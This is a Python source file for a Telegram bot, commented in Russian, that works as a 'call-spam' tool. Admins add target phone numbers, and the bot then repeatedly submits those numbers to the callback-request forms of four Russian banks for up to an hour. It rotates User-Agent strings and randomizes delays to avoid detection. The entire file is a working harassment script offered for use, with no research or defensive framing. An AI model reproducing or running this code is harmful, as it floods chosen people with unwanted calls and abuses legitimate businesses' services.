import asyncio
import aiohttp
import random
import logging
import sqlite3
import time
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode

# Настройка админов (замените на свои ID)
ADMIN_IDS = [6952852541]

# Инициализация бота (токен берется из переменных окружения)
bot = Bot(token="${BOT_TOKEN}", default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# База данных
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('call_spam.db', check_same_thread=False)
        self.create_tables()
    
    def create_tables(self):
        cursor = self.conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS targets (
                id INTEGER PRIMARY KEY,
                phone_number TEXT NOT NULL,
                status TEXT DEFAULT 'active',
                call_count INTEGER DEFAULT 0,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.conn.commit()

    def add_target(self, phone_number):
        cursor = self.conn.cursor()
        cursor.execute('INSERT INTO targets (phone_number) VALUES (?)', (phone_number,))
        self.conn.commit()
        return cursor.lastrowid

    def remove_target(self, phone_number):
        cursor = self.conn.cursor()
        cursor.execute('DELETE FROM targets WHERE phone_number = ?', (phone_number,))
        self.conn.commit()
        return cursor.rowcount

    def get_all_targets(self):
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM targets WHERE status = "active"')
        return cursor.fetchall()

    def increment_call_count(self, phone_number):
        cursor = self.conn.cursor()
        cursor.execute('UPDATE targets SET call_count = call_count + 1 WHERE phone_number = ?', (phone_number,))
        self.conn.commit()

# Сервисы для спама (сокращенный список для примера)
CALL_SERVICES = [
    {
        'name': 'Сбербанк',
        'url': 'https://www.sberbank.ru/ru/queries/putquestion',
        'method': 'POST',
        'data': {'phone': ''},
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'}
    },
    {
        'name': 'Тинькофф',
        'url': 'https://www.tinkoff.ru/feedback/order-call/',
        'method': 'POST', 
        'data': {'phone': ''},
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'}
    },
    {
        'name': 'Альфа-Банк',
        'url': 'https://alfabank.ru/api/feedback/call',
        'method': 'POST',
        'data': {'phoneNumber': ''},
        'headers': {'Content-Type': 'application/json'}
    },
    {
        'name': 'ВТБ',
        'url': 'https://www.vtb.ru/feedback/',
        'method': 'POST',
        'data': {'PHONE': ''},
        'headers': {'Content-Type': 'application/x-www-form-urlencoded'}
    }
]

class CallSpamManager:
    def __init__(self, db):
        self.db = db
        self.is_running = False
        self.successful_calls = 0
        self.failed_calls = 0
        
    async def start_spam(self, phone_number, duration=3600):
        """Запуск спама на номер"""
        if self.is_running:
            return False
            
        self.is_running = True
        self.successful_calls = 0
        self.failed_calls = 0
        
        # Запускаем асинхронную задачу
        asyncio.create_task(self._spam_worker(phone_number, duration))
        return True
    
    def stop_spam(self):
        """Остановка спама"""
        self.is_running = False
        return True
    
    async def _spam_worker(self, phone_number, duration):
        """Рабочий для спама"""
        end_time = time.time() + duration
        
        while time.time() < end_time and self.is_running:
            service = random.choice(CALL_SERVICES)
            success = await self._make_call_request(service, phone_number)
            
            if success:
                self.successful_calls += 1
                self.db.increment_call_count(phone_number)
            else:
                self.failed_calls += 1
                
            # Случайная задержка между запросами
            await asyncio.sleep(random.uniform(2, 10))
    
    async def _make_call_request(self, service, phone_number):
        """Асинхронный запрос на сервис"""
        try:
            formatted_phone = self._format_phone(phone_number)
            
            # Подготовка данных
            data = service['data'].copy()
            for key in data:
                if data[key] == '':
                    data[key] = formatted_phone
            
            headers = service['headers'].copy()
            headers['User-Agent'] = self._get_random_user_agent()
            
            timeout = aiohttp.ClientTimeout(total=10)
            
            async with aiohttp.ClientSession() as session:
                if service['method'] == 'POST':
                    if 'application/json' in headers.get('Content-Type', ''):
                        async with session.post(
                            service['url'],
                            json=data,
                            headers=headers,
                            timeout=timeout
                        ) as response:
                            return response.status in [200, 201, 202]
                    else:
                        async with session.post(
                            service['url'],
                            data=data,
                            headers=headers,
                            timeout=timeout
                        ) as response:
                            return response.status in [200, 201, 202]
                else:
                    async with session.get(
                        service['url'],
                        params=data,
                        headers=headers,
                        timeout=timeout
                    ) as response:
                        return response.status in [200, 201, 202]
                    
        except Exception as e:
            logging.error(f"Ошибка запроса к {service['name']}: {e}")
            return False
    
    def _format_phone(self, phone):
        """Форматирование номера телефона"""
        phone = phone.replace('+', '').replace(' ', '').replace('-', '')
        if phone.startswith('8') and len(phone) == 11:
            phone = '7' + phone[1:]
        return phone
    
    def _get_random_user_agent(self):
        """Случайный User-Agent"""
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0'
        ]
        return random.choice(user_agents)

# Инициализация
db = Database()
spam_manager = CallSpamManager(db)

# Клавиатура
def get_admin_keyboard():
    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text="📞 Добавить номер"),
                KeyboardButton(text="🗑 Удалить номер")
            ],
            [
                KeyboardButton(text="⚡ Запустить спам"),
                KeyboardButton(text="🛑 Остановить спам")
            ],
            [
                KeyboardButton(text="📊 Статистика"),
                KeyboardButton(text="📋 Список целей")
            ]
        ],
        resize_keyboard=True
    )

# Функции проверки прав
def is_admin(user_id):
    return user_id in ADMIN_IDS

async def admin_required(message: types.Message):
    if not is_admin(message.from_user.id):
        await message.answer("❌ У вас нет прав администратора!")
        return False
    return True

# Обработчики команд
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if not await admin_required(message):
        return
    
    await message.answer(
        "👨‍💻 Админ панель Call-Spam бота\n\n"
        f"📞 Сервисов для спама: {len(CALL_SERVICES)}\n"
        "Выберите действие:",
        reply_markup=get_admin_keyboard()
    )

@dp.message(Command("add"))
async def cmd_add(message: types.Message):
    if not await admin_required(message):
        return
    
    args = message.text.split()[1:]
    if args:
        phone = args[0]
        db.add_target(phone)
        await message.answer(f"✅ Номер {phone} добавлен в цели!")
    else:
        await message.answer("Использование: /add <номер телефона>")

@dp.message(Command("spam"))
async def cmd_spam(message: types.Message):
    if not await admin_required(message):
        return
    
    targets = db.get_all_targets()
    if not targets:
        await message.answer("❌ Нет активных целей для спама!")
        return
    
    duration = 3600  # 1 час по умолчанию
    
    args = message.text.split()[1:]
    if args:
        try:
            duration = int(args[0])
        except:
            pass
    
    for target in targets:
        phone = target[1]
        if await spam_manager.start_spam(phone, duration):
            await message.answer(
                f"✅ Спам запущен на номер: {phone}\n"
                f"⏱ Длительность: {duration} сек\n"
                f"📞 Сервисов: {len(CALL_SERVICES)}"
            )
        else:
            await message.answer(f"❌ Ошибка запуска спама на {phone}")

@dp.message(Command("stop"))
async def cmd_stop(message: types.Message):
    if not await admin_required(message):
        return
    
    if spam_manager.stop_spam():
        await message.answer(
            f"✅ Спам остановлен!\n"
            f"📞 Успешных запросов: {spam_manager.successful_calls}\n"
            f"❌ Неудачных: {spam_manager.failed_calls}"
        )
    else:
        await message.answer("⚠️ Спам не был запущен!")

@dp.message(Command("stats"))
async def cmd_stats(message: types.Message):
    if not await admin_required(message):
        return
    
    targets = db.get_all_targets()
    total_calls = sum(target[3] for target in targets)
    
    stats_text = f"""
📊 Статистика:

🎯 Активных целей: {len(targets)}
📞 Всего вызовов: {total_calls}
🔄 Статус спама: {'🟢 Активен' if spam_manager.is_running else '🔴 Остановлен'}
✅ Успешных запросов: {spam_manager.successful_calls}
❌ Неудачных: {spam_manager.failed_calls}

📋 Сервисов: {len(CALL_SERVICES)}
"""
    
    await message.answer(stats_text)

@dp.message(F.text == "📞 Добавить номер")
async def add_number_handler(message: types.Message):
    if not await admin_required(message):
        return
    await message.answer("Введите номер телефона для добавления:\n\nПример: +79991234567")

@dp.message(F.text == "🗑 Удалить номер")
async def remove_number_handler(message: types.Message):
    if not await admin_required(message):
        return
    await message.answer("Введите номер телефона для удаления:")

@dp.message(F.text == "⚡ Запустить спам")
async def start_spam_handler(message: types.Message):
    await cmd_spam(message)

@dp.message(F.text == "🛑 Остановить спам")
async def stop_spam_handler(message: types.Message):
    await cmd_stop(message)

@dp.message(F.text == "📊 Статистика")
async def stats_handler(message: types.Message):
    await cmd_stats(message)

@dp.message(F.text == "📋 Список целей")
async def targets_handler(message: types.Message):
    if not await admin_required(message):
        return
    
    targets = db.get_all_targets()
    if not targets:
        await message.answer("📭 Список целей пуст!")
        return
    
    targets_text = "📋 Список целей:\n\n"
    for i, target in enumerate(targets, 1):
        targets_text += f"{i}. {target[1]} (звонков: {target[3]})\n"
    
    await message.answer(targets_text)

@dp.message()
async def text_handler(message: types.Message):
    if not await admin_required(message):
        return
    
    text = message.text
    
    # Проверяем, является ли текст номером телефона (простая проверка)
    if any(char.isdigit() for char in text) and len(text) > 5:
        # Если в предыдущем сообщении просили добавить номер
        if "добавления" in (await get_last_bot_message(message.chat.id)):
            db.add_target(text)
            await message.answer(f"✅ Номер {text} добавлен в цели!")
        
        # Если в предыдущем сообщении просили удалить номер
        elif "удаления" in (await get_last_bot_message(message.chat.id)):
            count = db.remove_target(text)
            if count > 0:
                await message.answer(f"✅ Номер {text} удален!")
            else:
                await message.answer("❌ Номер не найден!")

async def get_last_bot_message(chat_id):
    """Получить последнее сообщение бота (упрощенная версия)"""
    # В реальном приложении нужно хранить историю сообщений
    return ""

# Запуск бота
async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())